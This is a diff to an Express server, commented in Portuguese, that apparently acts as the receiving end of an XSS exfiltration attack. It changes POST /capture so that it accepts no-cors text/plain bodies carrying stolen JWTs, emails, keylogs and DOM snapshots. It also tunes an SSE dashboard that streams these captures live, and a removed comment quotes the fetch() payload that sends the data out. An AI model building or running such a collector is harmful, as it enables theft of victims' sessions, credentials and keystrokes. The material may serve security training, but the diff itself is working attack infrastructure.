@@ -17,6 +17,9 @@ const TRANSPARENT_GIF = Buffer.from(
 app.use(cors({ origin: '*', methods: ['GET', 'POST', 'DELETE'] }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
+// text/plain é o único Content-Type liberado em no-cors cross-origin
+// (o browser descarta Content-Type: application/json em requests no-cors)
+app.use(express.text({ type: ['text/plain', 'text/*', 'application/json'] }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ── Estado em memória ──────────────────────────────────────────────────────
@@ -25,23 +28,31 @@ const sseClients = []; // clientes do dashboard conectados via SSE
 
 // ── SSE: dashboard recebe atualizações em tempo real ──────────────────────
 app.get('/events', (req, res) => {
+  if (req.socket) req.socket.setNoDelay(true); // desativa Nagle — entrega imediata
+
   res.setHeader('Content-Type', 'text/event-stream');
-  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Cache-Control', 'no-cache, no-transform');
   res.setHeader('Connection', 'keep-alive');
+  res.setHeader('X-Accel-Buffering', 'no');
   res.flushHeaders();
 
-  // Envia estado atual ao conectar
-  res.write(`event: init\ndata: ${JSON.stringify(captures)}\n\n`);
+  // Usa evento padrão (onmessage) com campo "event" no payload JSON
+  // — mais compatível que eventos SSE nomeados em diferentes contextos
+  res.write(`data: ${JSON.stringify({ event: 'init', data: captures })}\n\n`);
+
+  // Heartbeat a cada 15s — mantém conexão viva
+  const heartbeat = setInterval(() => res.write(': ping\n\n'), 15000);
 
   sseClients.push(res);
   req.on('close', () => {
+    clearInterval(heartbeat);
     const i = sseClients.indexOf(res);
     if (i !== -1) sseClients.splice(i, 1);
   });
 });
 
 function broadcast(event, data) {
-  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
+  const msg = `data: ${JSON.stringify({ event, data })}\n\n`;
   sseClients.forEach(c => c.write(msg));
 }
 
@@ -77,18 +88,24 @@ app.get('/capture', (req, res) => {
 });
 
 // ── Endpoint POST /capture — exfiltração via fetch() ──────────────────────
-// Payload: fetch('http://localhost:4000/capture', {method:'POST', mode:'no-cors',
-//   headers:{'Content-Type':'application/json'}, body: JSON.stringify({...})})
+// Com mode:'no-cors' cross-origin o browser descarta Content-Type:application/json
+// O browser permite apenas text/plain em no-cors — parseamos manualmente
 app.post('/capture', (req, res) => {
+  let b = req.body;
+  if (typeof b === 'string') {
+    try { b = JSON.parse(b); } catch { b = {}; }
+  }
+  if (!b || typeof b !== 'object') b = {};
+
   register(buildEntry(req, {
-    type:      req.body.type      || 'post',
-    data:      req.body.data      || '',
-    url:       req.body.url       || '',
-    extra:     req.body.extra     || '',
-    jwt:       req.body.jwt       || '',
-    email:     req.body.email     || '',
-    keylog:    req.body.keylog    || '',
-    domSnap:   req.body.domSnap   || '',
+    type:    b.type    || 'post',
+    data:    b.data    || '',
+    url:     b.url     || '',
+    extra:   b.extra   || '',
+    jwt:     b.jwt     || '',
+    email:   b.email   || '',
+    keylog:  b.keylog  || '',
+    domSnap: b.domSnap || '',
   }));
   res.status(204).end();
 });
